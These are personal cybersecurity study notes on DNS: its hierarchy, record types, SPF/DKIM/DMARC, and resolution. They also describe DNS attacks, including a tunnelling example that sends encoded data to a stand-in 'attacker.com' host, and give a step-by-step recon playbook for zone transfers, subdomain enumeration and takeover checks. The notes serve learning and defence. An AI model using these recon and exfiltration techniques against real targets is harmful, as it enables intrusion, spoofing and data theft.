# Section 4 — DNS Complete Reference

> **Nameless Flow's Master Notes** | Domain Name System · Records · Resolution · Attacks
> _"DNS is the most invisible and most attackable protocol on the internet. Master it."_

---

# PART 1 — WHAT IS DNS?

## The Core Idea

**DNS (Domain Name System)** translates human-readable domain names into IP addresses.

```
tryhackme.com  →  DNS  →  104.26.10.229
```

Without DNS you'd need to memorize IP addresses for every website. DNS is the internet's phone book — except it's not stored in one place. It's a **globally distributed, hierarchical database** across millions of servers worldwide handling over **1 trillion queries per day**.

## Why DNS Is Distributed — The Scale Problem

One centralized database would need to:

- Handle trillions of queries daily
- Accept millions of updates daily
- Never go down — ever
- Be trusted by every device on earth

**Impossible.** So DNS is hierarchical — each tier only carries what it needs:

- Root servers → know who manages each TLD
- TLD servers → know who manages each domain
- Authoritative servers → know the actual records
- Recursive resolvers → do the legwork and cache results

Most queries never reach authoritative servers because caching handles them at the resolver level.

---

# PART 2 — DOMAIN HIERARCHY

## Reading Domain Names

**Always read right to left.** Every dot = one level up the tree.

```
jupiter.servers.tryhackme.com

Reading right to left:
.           → Root (invisible, always present)
com         → Top-Level Domain (TLD)
tryhackme   → Second-Level Domain (SLD)
servers     → Subdomain
jupiter     → Sub-subdomain
```

## The Four Levels

### Root Domain — "."

- Invisible — the dot at the end of every domain (`tryhackme.com.`)
- Managed by IANA (Internet Assigned Numbers Authority)
- 13 root server clusters (A through M), ~1,500 physical servers worldwide via anycast
- Starting point of ALL DNS resolution
- Pre-configured (hardcoded) in every resolver — no chicken-and-egg problem

### Top-Level Domain (TLD)

**gTLD (Generic)** — indicates purpose:
| TLD | Purpose |
|---|---|
| .com | Commercial |
| .org | Organisation |
| .edu | Education |
| .gov | Government (US) |
| .mil | Military (US) |
| .net | Network |
| .online, .club, .website, .biz | New gTLDs (2000+ exist now) |

**ccTLD (Country Code)** — indicates geography:
| TLD | Country |
|---|---|
| .ph | Philippines |
| .uk | United Kingdom |
| .jp | Japan |
| .ca | Canada |
| .co.uk | UK commercial (two-part ccTLD) |

### Second-Level Domain (SLD)

- The part you register and own (`tryhackme` in `tryhackme.com`)
- Limited to **63 characters**
- Only `a-z`, `0-9`, and hyphens
- Cannot start/end with hyphens or have consecutive hyphens (`--`)

### Subdomain

- Sits left of the SLD, separated by dots (`admin.tryhackme.com`)
- Same character rules as SLD (63 chars, a-z 0-9 hyphens)
- Can chain multiple: `jupiter.servers.tryhackme.com`
- **No limit** on number of subdomains
- Max total domain length: **253 characters**
- YOU control these — no registration needed

## Subdomain Attack Surface

Organizations expose infrastructure as subdomains — often less secured than the main domain:

```
admin.target.com        → admin panel
dev.target.com          → development environment
staging.target.com      → staging server
api.target.com          → API endpoint
vpn.target.com          → VPN gateway
mail.target.com         → mail server
jira.target.com         → project management
jenkins.target.com      → CI/CD pipeline
gitlab.target.com       → source code
```

**Tools:** dnsrecon, subfinder, amass, gobuster (dns mode), dnsx

---

# PART 3 — DNS RECORD TYPES

## Complete Record Reference

### A Record — IPv4 Address

Maps domain to IPv4 address. The most fundamental DNS record.

```
tryhackme.com.  300  IN  A  104.26.10.229
```

**Attack relevance:** Target of DNS cache poisoning. Forge A record → victim connects to wrong IP.

---

### AAAA Record — IPv6 Address

Same as A but for IPv6.

```
tryhackme.com.  300  IN  AAAA  2606:4700:20::681a:a2f
```

**Attack relevance:** IPv6 DNS often bypasses IPv4-focused security tools. Attackers pivot to AAAA records to evade detection. Always check both.

---

### CNAME Record — Canonical Name (Alias)

Points one domain to another domain name (not directly to IP). Target domain is then resolved separately.

```
store.tryhackme.com.   300  IN  CNAME  shops.shopify.com.
shops.shopify.com.     300  IN  A      23.227.38.65
```

**How resolution works:**

```
Browser: "IP for store.tryhackme.com?"
Resolver: CNAME → shops.shopify.com
Resolver: A record → 23.227.38.65
Returns: 23.227.38.65 (transparent to browser)
```

**Attack relevance:** CNAME Subdomain Takeover (see Part 6)

---

### MX Record — Mail Exchange

Specifies which servers handle email. Has priority value — lower = higher priority.

```
tryhackme.com.  300  IN  MX  10  alt1.aspmx.l.google.com.
tryhackme.com.  300  IN  MX  20  alt2.aspmx.l.google.com.
```

**Recon value:**

```
alt1.aspmx.l.google.com     → Google Workspace
mail.protection.outlook.com → Microsoft 365
aspmx.l.google.com          → Google Workspace
mxa.mailgun.org             → Mailgun
```

**Attack relevance:** Reveals email infrastructure. Informs phishing approach. MX to Google = different attack path than on-premise Exchange.

---

### TXT Record — Free-form Text

Free text fields. Multiple uses. **Goldmine for recon.**

**SPF Record — who can send email for this domain:**

```
@ TXT "v=spf1 ip4:192.0.2.0/24 include:_spf.google.com include:amazonses.com ~all"

v=spf1                    → SPF version 1
ip4:192.0.2.0/24          → own mail servers authorized
include:_spf.google.com   → Google Workspace authorized
include:amazonses.com     → Amazon SES authorized
~all                      → everything else = SOFTFAIL (weak)
```

**SPF Enforcement Levels:**
| Mechanism | Meaning | Security |
|---|---|---|
| `+all` | Allow everyone | Completely broken |
| `~all` | Softfail — accept but tag | Weak |
| `-all` | Hardfail — reject | Strong |
| `?all` | Neutral | Useless |

**DMARC Record — what to do when SPF/DKIM fail:**

```
_dmarc.example.com TXT "v=DMARC1; p=reject; rua=mailto:reports@example.com; adkim=s; aspf=s; pct=100"

v=DMARC1     → DMARC version
p=reject     → reject failing emails (p=none=monitor only, p=quarantine=spam)
rua=mailto:  → send aggregate reports here
adkim=s      → strict DKIM alignment
aspf=s       → strict SPF alignment
pct=100      → apply to 100% of failing emails
```

**DMARC Policy Attack Assessment:**
| What You See | Attack Viability |
|---|---|
| No DMARC record | Zero protection. Spoofing trivial. |
| `p=none` | Monitor only. Spoofing still works. |
| `p=quarantine` + `~all` | Some protection. May still get through. |
| `p=reject` + `-all` + `pct=100` | Strong. Use lookalike domain instead. |

**ACME Challenge:**

```
_acme-challenge.example.com TXT "token_value_here"
```

Domain ownership verification for Let's Encrypt TLS certificates.
**Recon:** Uses free certs = modern DevOps or smaller operation.

**Service Verification Tokens:**

```
@ TXT "MS=ms12345678"        → Microsoft 365 in use
@ TXT "google-site-verification=abc" → Google services
@ TXT "atlassian-domain-verification=abc" → Jira/Confluence
@ TXT "stripe-verification=abc" → Stripe payments
```

**Recon:** Technology stack fingerprint. Each token reveals a platform.

---

### NS Record — Name Server

Specifies authoritative nameservers for this domain.

```
tryhackme.com.  86400  IN  NS  kip.ns.cloudflare.com.
tryhackme.com.  86400  IN  NS  uma.ns.cloudflare.com.
```

**Attack relevance:** Reveals DNS provider. Zone transfer attempts go here. NS takeover if NS points to unregistered domain.

---

### PTR Record — Reverse DNS

Maps IP address back to domain name.

```
229.10.26.104.in-addr.arpa.  300  IN  PTR  tryhackme.com.
```

**Attack relevance:** Reveals hostnames of IPs. Internal naming conventions exposed: `web-prod-01.internal.corp.com` reveals role, environment, naming scheme.

---

### SOA Record — Start of Authority

Administrative info about DNS zone. Every zone has exactly one.

```
tryhackme.com. 3600 IN SOA ns1.cloudflare.com. dns.cloudflare.com. 2024010101 3600 900 604800 300

Fields: primary-ns admin-email serial refresh retry expire minimum-ttl
```

**Attack relevance:** Admin email useful for phishing. Serial number reveals update frequency. Zone transfer (AXFR) starts by requesting SOA.

---

## Email Security Trinity: SPF + DKIM + DMARC

### DKIM — DomainKeys Identified Mail

Cryptographic proof email wasn't tampered with. Mail server signs outgoing email with private key. Public key lives in DNS.

```
selector._domainkey.example.com TXT "v=DKIM1; k=rsa; p=MIGfMA0GCS..."

How it works:
Sending:   Hash headers+body → sign with private key → add DKIM-Signature header
Receiving: Fetch public key from DNS → verify signature → match = authentic
```

**DKIM selector recon:**

```
google._domainkey    → Google Workspace
s1._domainkey        → SendGrid
k1._domainkey        → Mailchimp
selector1._domainkey → Microsoft 365
```

### SPF vs DKIM vs DMARC

```
SPF:   "Did this email come from an AUTHORIZED SERVER?"
       → Can be bypassed by using authorized relay
       → Breaks on forwarding (new server = new IP)

DKIM:  "Was this email SIGNED by the domain's private key?"
       → Survives forwarding — signature travels with email
       → Proves content wasn't modified

DMARC: "What do you DO when SPF and/or DKIM fail?"
       → The enforcement layer that ties both together
       → Enables reporting so you see spoofing attempts
```

---

# PART 4 — THE FIVE ACTORS IN DNS RESOLUTION

## Actor 1 — Your Machine (Client)

**Checks in this order:**

1. Local DNS cache (OS memory)
2. `/etc/hosts` (Linux) or `C:\Windows\System32\drivers\etc\hosts` (Windows) — **checked BEFORE DNS, overrides everything**
3. Configured DNS resolver

```bash
# Linux
cat /etc/resolv.conf              # which resolver am I using?
systemd-resolve --statistics      # cache stats
resolvectl flush-caches           # flush cache
cat /etc/hosts                    # hosts file

# Windows
ipconfig /displaydns              # view cache
ipconfig /flushdns                # flush cache
```

**Attack:** Modify hosts file → redirect any domain silently. Malware does this to redirect bank sites, block AV updates.

---

## Actor 2 — Recursive Resolver

**The workhorse.** Your machine's single point of contact. Does all legwork on your behalf.

**Common resolvers:**
| IP | Provider | Notes |
|---|---|---|
| 8.8.8.8 | Google Public DNS | Fast, widely used |
| 8.8.4.4 | Google (secondary) | |
| 1.1.1.1 | Cloudflare | Fastest, privacy-focused |
| 1.0.0.1 | Cloudflare (secondary) | |
| 9.9.9.9 | Quad9 | Security-focused, blocks malicious domains |
| 208.67.222.222 | OpenDNS | Configurable filtering |

**Cache behavior:** Caches ALL answers for TTL duration. Popular domains almost never require full resolution — always cached. This is why most queries complete in ~1ms.

**Attack:** DNS hijacking via compromised router → attacker controls your resolver → controls ALL your DNS answers.

---

## Actor 3 — Root DNS Servers

**The backbone of the entire internet.**

- 13 root server names (A through M root-servers.net)
- ~1,500 physical servers worldwide via anycast routing
- Operated by: Verisign, USC-ISI, Cogent, NASA, ICANN, RIPE NCC, and others
- **Know ONLY:** which nameservers manage each TLD (.com, .org, .ph, etc.)
- **Hardcoded** in every resolver via root.hints file — no lookup needed

```bash
# Query a root server directly
dig @a.root-servers.net tryhackme.com
# Response: "I don't know the IP, but .com is managed by:"
# a.gtld-servers.net, b.gtld-servers.net...

# See root hints file
cat /usr/share/dns/root.hints
```

---

## Actor 4 — TLD Nameservers

**Manages one TLD.**

- `.com` TLD: a.gtld-servers.net through m.gtld-servers.net (Verisign)
- Handle ~1 trillion `.com` queries per day
- Know for every registered domain: which nameservers are authoritative

```bash
# Query .com TLD server directly
dig @a.gtld-servers.net tryhackme.com
# Response: "tryhackme.com is managed by:"
# kip.ns.cloudflare.com, uma.ns.cloudflare.com
```

**Attack:** Domain hijacking via registrar compromise → change NS records TLD returns → control all DNS for the domain.

---

## Actor 5 — Authoritative Nameserver

**The source of truth. The final answer.**

- Runs: Cloudflare, Route53 (AWS), Azure DNS, Google Cloud DNS, or self-hosted BIND/PowerDNS
- Holds ALL DNS records for its domains — A, AAAA, MX, TXT, CNAME, NS, SOA
- No caching — always fresh, always authoritative
- Multiple for redundancy (primary + secondary)

```bash
# TryHackMe's authoritative nameservers:
# kip.ns.cloudflare.com
# uma.ns.cloudflare.com

# Query authoritative directly (fresh, bypasses resolver cache)
dig @kip.ns.cloudflare.com tryhackme.com
# Returns: 104.26.10.229 (directly from source — uncached)

# Zone transfer attempt (recon)
dig axfr @kip.ns.cloudflare.com tryhackme.com
# Cloudflare: blocked correctly
# Misconfigured self-hosted: returns ALL records
```

---

# PART 5 — THE FULL DNS RESOLUTION PROCESS

## Step-by-Step: Resolving tryhackme.com

```
Step 1: Local cache check
Your machine → checking local DNS cache → miss
Your machine → checking /etc/hosts → not found
Your machine → query resolver: 8.8.8.8

Step 2: Resolver cache check
8.8.8.8 → checking cache → miss (or TTL expired)
8.8.8.8 → starting full resolution

Step 3: Query root server
8.8.8.8 → a.root-servers.net: "Who manages .com?"
← Response: "a.gtld-servers.net, b.gtld-servers.net..."

Step 4: Query TLD nameserver
8.8.8.8 → a.gtld-servers.net: "Who manages tryhackme.com?"
← Response: "kip.ns.cloudflare.com, uma.ns.cloudflare.com"

Step 5: Query authoritative nameserver
8.8.8.8 → kip.ns.cloudflare.com: "A record for tryhackme.com?"
← Response: "104.26.10.229, TTL=300"

Step 6: Resolver caches + returns
8.8.8.8 → caches 104.26.10.229 for 300 seconds
8.8.8.8 → your machine: "104.26.10.229"
Your machine → caches locally
Your browser → TCP connect → 104.26.10.229:443
Total time: ~50-200ms
```

## Recursive vs Iterative Queries

```
Your machine → resolver: RECURSIVE query ("find the complete answer")
Resolver → root:          ITERATIVE query ("where should I go next?")
Resolver → TLD:           ITERATIVE query ("where should I go next?")
Resolver → authoritative: ITERATIVE query ("what's the answer?")

Client-to-resolver = recursive (one query, complete answer)
Resolver-to-everything-else = iterative (referrals, resolver follows)
Computational work happens at the resolver — not your machine
```

## Why Most Queries Skip Steps 3-5

Resolvers like 8.8.8.8 handle billions of queries daily. Popular domains (google.com, facebook.com, youtube.com) are cached constantly. TTL hasn't expired. Steps 3-5 only occur for:

- Obscure/unpopular domains
- After TTL expiry
- First time a domain is queried after DNS propagation

---

# PART 6 — TTL (TIME TO LIVE)

## What TTL Does

Every DNS record has a TTL in seconds. After expiry, cached answer is discarded and fresh lookup performed. Set by domain owner at authoritative server.

```
tryhackme.com.  300  IN  A  104.26.10.229
                ↑
                TTL = 300 seconds = 5 minutes
```

## TTL Values and Their Meaning

| TTL   | Duration  | Use case                                  | Query load |
| ----- | --------- | ----------------------------------------- | ---------- |
| 60    | 1 minute  | Load balancers, volatile services         | Very high  |
| 300   | 5 minutes | Typical web servers (TryHackMe uses this) | Moderate   |
| 3600  | 1 hour    | Stable services                           | Normal     |
| 86400 | 24 hours  | Very stable, rarely changes               | Low        |

## TTL and Attacks

**Pre-attack TTL drop:**

```
1. Attacker compromises domain registrar or nameserver
2. Lowers TTL from 86400 → 60 seconds
3. Waits for current caches to expire (~24 hours)
4. Changes A record to malicious server
5. Poison spreads globally in 60 seconds
6. Even after fix: recovery also takes 60 seconds
```

**TTL diagnostic:**

```bash
# Watch TTL countdown (run twice, see it decrease)
dig tryhackme.com +ttlid    # shows 300
# Wait 30 seconds
dig tryhackme.com +ttlid    # shows 270 → cached, counting down

# If second query shows TTL=300 again:
# → resolver re-fetched from authoritative (cache expired or flushed)
```

---

# PART 7 — DNS ATTACK SURFACE

## Attack 1: DNS Cache Poisoning / Spoofing

Inject forged DNS responses into resolver cache before real response arrives.

```
Attack flow:
1. Attacker monitors resolver queries
2. Forges response for bank.com: "IP is 10.evil.server"
3. Sends forged response before real authoritative server responds
4. Resolver caches forged answer
5. Every client using that resolver: bank.com → attacker's server
6. Victims enter credentials on fake site — silently harvested

Scale: One poisoned resolver → millions of affected users
Detection: Compare resolver answer vs authoritative directly
Fix: DNSSEC — cryptographically signed records, forgery impossible
```

## Attack 2: DNS Tunneling — Data Exfiltration

Encode stolen data inside DNS queries. DNS almost never blocked by firewalls.

```
Normal:   lookup tryhackme.com
Tunnel:   lookup aGVsbG8gd29ybGQ.attacker.com
                 ↑ base64-encoded stolen data chunk

How it works:
1. Attacker controls attacker.com and its nameserver
2. Malware encodes stolen data as subdomains
3. Queries go out as "normal DNS"
4. Attacker's nameserver logs all queries
5. Reconstruct stolen data from subdomain chunks

Tools: dnscat2 (full C2 over DNS), iodine (VPN over DNS)
Detection: Abnormal query volume, unusually long subdomain names,
           high entropy subdomain strings, non-standard record types
```

## Attack 3: Zone Transfer (AXFR) — Full Infrastructure Dump

Misconfigured nameserver allows anyone to request all DNS records.

```bash
# Step 1: Find nameservers
dig ns target.com

# Step 2: Attempt zone transfer
dig axfr @ns1.target.com target.com

# If vulnerable — returns EVERY record:
target.com.          A     203.45.67.89
www.target.com.      A     203.45.67.89
mail.target.com.     A     203.45.67.91
dev.target.com.      A     10.0.0.50        ← internal!
admin.target.com.    A     10.0.0.100       ← internal!
vpn.target.com.      A     203.45.67.95
db.target.com.       A     10.0.0.200       ← database server!
# Complete infrastructure map with zero scanning
```

## Attack 4: Subdomain Enumeration

Brute-force subdomains using wordlists. Passive — no direct target contact.

```bash
# Brute-force with wordlist
dnsrecon -d target.com -t brt -D /usr/share/wordlists/subdomains.txt

# Passive (uses certificate transparency, APIs)
subfinder -d target.com -o subdomains.txt
amass enum -d target.com

# Fast DNS resolution
dnsx -l subdomains.txt -a -resp

# Certificate transparency logs (no scanning needed)
curl "https://crt.sh/?q=%.target.com&output=json"
```

## Attack 5: DNS Amplification DDoS

Spoof victim's IP in tiny DNS query → large response sent to victim.

```
Attack:
Attacker → [src=victim_IP] → open resolver: "ANY target.com?" (60 bytes)
Open resolver → victim: full DNS response (3000 bytes)
Amplification: 50x

With 10,000 open resolvers:
Attacker sends: 600KB
Victim receives: 30MB
→ Scale to Tbps DDoS with minimal attacker bandwidth

Defenses:
- BCP38: ingress filtering — ISPs verify source IPs
- Rate limiting on DNS resolvers
- Block ANY record type queries
- Recursive resolvers should not be open to internet
```

## Attack 6: CNAME Subdomain Takeover

One of the most valuable bug bounty findings. Completely passive to discover.

```
How it happens:
1. Developer: shop.target.com CNAME target-store.myshopify.com
2. Later: Shopify store deleted, DNS record never removed
3. dig shop.target.com → CNAME target-store.myshopify.com
   dig target-store.myshopify.com → NXDOMAIN (doesn't exist)
4. Attacker registers target-store on Shopify
5. shop.target.com now resolves to ATTACKER's Shopify store

Impact:
- Serve phishing page under target.com's trusted domain
- Steal cookies scoped to *.target.com
- Serve malicious downloads under trusted brand
- Host convincing credential harvesting page

Vulnerable services:
Shopify, GitHub Pages, Heroku, Fastly, AWS Elastic Beanstalk,
Azure App Service, Netlify, HubSpot, Tumblr, Surge.sh

Finding takeovers:
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt
nuclei -l subdomains.txt -t takeovers/

Reference: https://github.com/EdOverflow/can-i-take-over-xyz
Bug bounty value: $500–$5,000+ per finding
```

## Attack 7: Hosts File Manipulation

Malware modifies hosts file — checked BEFORE DNS, overrides everything.

```
Linux:   /etc/hosts
Windows: C:\Windows\System32\drivers\etc\hosts

Malware adds:
192.168.evil.1  bank.com          → phishing site
192.168.evil.1  paypal.com        → phishing site
0.0.0.0         avupdate.com      → blocks antivirus updates
0.0.0.0         windowsupdate.com → blocks Windows updates

Detection: Compare hosts file to known-good baseline
Monitoring: auditd (Linux), Sysmon (Windows) can alert on hosts file changes
```

## Attack 8: DNS Hijacking via Router

Compromise router → change DNS server → control all client DNS.

```
Normal:  Client → 8.8.8.8 (Google) → correct answers
Attacked: Client → 10.evil.1 (attacker's DNS) → manipulated answers

Attack path:
1. Compromise router (default creds, firmware CVE)
2. Change DHCP DNS setting from 8.8.8.8 to 10.evil.1
3. All clients on network automatically use attacker's DNS
4. Attacker returns correct answers for everything except targets
5. Victims transparently redirected to phishing servers

Detection: Check what DNS server you're actually using
dig tryhackme.com                         # what resolver returns
dig @8.8.8.8 tryhackme.com                # Google's answer
dig @kip.ns.cloudflare.com tryhackme.com  # authoritative truth
# If first ≠ third → possible hijacking
```

---

# PART 8 — COMPLETE DIG COMMAND REFERENCE

```bash
# ═══════════════════════════════════════════════
# BASIC QUERIES
# ═══════════════════════════════════════════════

# A record (IPv4)
dig tryhackme.com

# Specific record types
dig tryhackme.com AAAA          # IPv6
dig tryhackme.com MX            # mail servers
dig tryhackme.com TXT           # text records (SPF, DMARC, verification)
dig tryhackme.com NS            # nameservers
dig tryhackme.com CNAME         # aliases
dig tryhackme.com SOA           # zone authority info
dig tryhackme.com ANY           # all records (often blocked)

# Short output (just the answer, no headers)
dig tryhackme.com +short

# ═══════════════════════════════════════════════
# TARGETING SPECIFIC SERVERS
# ═══════════════════════════════════════════════

# Query specific resolver
dig @8.8.8.8 tryhackme.com      # Google
dig @1.1.1.1 tryhackme.com      # Cloudflare
dig @9.9.9.9 tryhackme.com      # Quad9

# Query authoritative directly (fresh, uncached)
dig @kip.ns.cloudflare.com tryhackme.com

# Query root server directly
dig @a.root-servers.net tryhackme.com

# Query TLD server directly
dig @a.gtld-servers.net tryhackme.com

# ═══════════════════════════════════════════════
# TRACING AND DEBUGGING
# ═══════════════════════════════════════════════

# Trace full resolution path (root → TLD → authoritative)
dig tryhackme.com +trace

# Show TTL on cached answers
dig tryhackme.com +ttlid

# Verbose — show all DNS flags and sections
dig tryhackme.com +all

# No recursion — ask resolver for its cached answer only
dig tryhackme.com +norecurse

# ═══════════════════════════════════════════════
# REVERSE DNS
# ═══════════════════════════════════════════════

# Reverse lookup (IP → hostname)
dig -x 104.26.10.229

# ═══════════════════════════════════════════════
# SECURITY / RECON
# ═══════════════════════════════════════════════

# Zone transfer attempt (AXFR)
dig axfr @ns1.target.com target.com

# Check if poisoning occurred (compare resolver vs authoritative)
dig tryhackme.com                              # resolver (possibly cached/poisoned)
dig @kip.ns.cloudflare.com tryhackme.com       # authoritative (truth)
# Different answers = resolver compromised or poisoned

# Check SPF record
dig target.com TXT | grep spf

# Check DMARC policy
dig _dmarc.target.com TXT

# Check DKIM (need to know selector)
dig google._domainkey.target.com TXT
dig selector1._domainkey.target.com TXT

# ═══════════════════════════════════════════════
# SUBDOMAIN ENUMERATION
# ═══════════════════════════════════════════════

# Brute force
dnsrecon -d target.com -t brt -D /usr/share/wordlists/subdomains.txt

# Passive (certificate transparency + APIs)
subfinder -d target.com -o subs.txt
amass enum -passive -d target.com

# Fast resolver
dnsx -l subs.txt -a -resp -o live_subs.txt

# Certificate transparency (completely passive, no DNS queries)
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u
```

---

# PART 9 — THE DNS RECON PLAYBOOK

## Full Target DNS Recon Sequence

Run this on every target before touching anything else. Completely passive. Undetectable.

```bash
# ═══ STEP 1: Basic infrastructure ═══
dig target.com A             # main IP, hosting provider
dig target.com AAAA          # IPv6 (often less monitored)
dig target.com NS            # who manages DNS?
dig target.com SOA           # primary NS, admin email, serial

# ═══ STEP 2: Email infrastructure ═══
dig target.com MX            # email provider (Google/M365/self-hosted)
dig target.com TXT           # SPF, DMARC, service verifications

# ═══ STEP 3: Assess email security ═══
# From TXT records:
# No SPF or SPF with ~all → email spoofing viable
# DMARC p=none or missing → spoofing viable
# MS= token → Microsoft 365 → password spray target
# google-site-verification → Google Workspace

# ═══ STEP 4: Find nameservers, attempt zone transfer ═══
dig target.com NS
dig axfr @ns1.target.com target.com
# If successful: complete infrastructure map

# ═══ STEP 5: Enumerate subdomains ═══
subfinder -d target.com | dnsx -a -resp -o live_subs.txt
amass enum -d target.com

# ═══ STEP 6: Check for subdomain takeovers ═══
subjack -w live_subs.txt -t 100 -o takeovers.txt
nuclei -l live_subs.txt -t takeovers/

# ═══ STEP 7: Reverse DNS — find more hosts ═══
dig -x [target_IP]
# Then check neighboring IPs in the same range
```

## What Each DNS Query Tells You

| Query           | What you learn                                                |
| --------------- | ------------------------------------------------------------- |
| A record        | Hosting provider (AWS/Cloudflare/etc.), CDN usage, real IP    |
| AAAA record     | IPv6 deployment, often less monitored                         |
| MX record       | Email platform (Google Workspace, Microsoft 365, self-hosted) |
| TXT → SPF       | Mail servers used, cloud services, email spoofing viability   |
| TXT → DMARC     | Security maturity, enforcement policy                         |
| TXT → MS=       | Microsoft 365 in use → password spray path                    |
| TXT → google-   | Google Workspace in use                                       |
| NS record       | DNS provider, zone transfer targets                           |
| AXFR attempt    | If successful: complete internal infrastructure map           |
| Subdomain enum  | Dev/staging/admin/API attack surface                          |
| CNAME chains    | Potential subdomain takeover opportunities                    |
| PTR/reverse DNS | Internal naming conventions, server roles, OS hints           |

---

# PART 10 — CRITICAL CONCEPTS & MISCONCEPTIONS

## Things That Never Change

- DNS resolution always starts with the resolver checking its cache
- /etc/hosts is always checked BEFORE DNS — it overrides everything
- Root servers don't know IP addresses — only TLD nameservers
- TLD servers don't know IP addresses — only authoritative nameservers
- Authoritative nameservers are the only source of truth
- TTL controls how long the answer is trusted — set by domain owner
- DNS uses UDP port 53 by default; TCP port 53 for zone transfers and large responses
- Recursive queries: client → resolver. Iterative queries: resolver → root/TLD/auth

## Root Servers and Malicious Domains

Root servers are neutral infrastructure. They return referrals for ALL domains — including malicious ones. The root server cannot know if a domain is used for evil. **This is by design.** The correct layer to block malicious domains is:

1. Recursive resolver level (Quad9 9.9.9.9 blocks malicious domains here)
2. Firewall/proxy level
3. Host level (/etc/hosts, endpoint security)

NOT at the root server level — that would centralize control and break the internet's neutral, distributed design.

## The Correct Layer for DNS-Based Blocking

```
Use 9.9.9.9 (Quad9) → blocks known malicious domains at resolver
Enterprise: RPZ (Response Policy Zones) on internal resolver
Endpoint: /etc/hosts or security agent
Firewall: Block outbound port 53 except to approved resolvers (prevents DNS hijacking)
```

## DNS as Recon vs Active Attack

```
DNS recon (passive, undetectable):
- dig queries to public resolvers
- Certificate transparency logs
- WHOIS lookups
→ Target has NO idea you're looking

DNS active attack (detectable):
- Zone transfer attempts (logged at nameserver)
- Brute-force subdomain enumeration (high query volume)
- DNS cache poisoning (requires network position)
→ May trigger alerts
```

---

_Notes compiled from TryHackMe Pre-Security Path — Section 4 + extended deep dives with Claude_
_Nameless Flow | Cybersecurity & Networks Engineer Roadmap — Phase 1_
_DNS · Domain Hierarchy · Record Types · SPF · DKIM · DMARC · Resolution Process · TTL · Attack Surface · Recon Playbook_
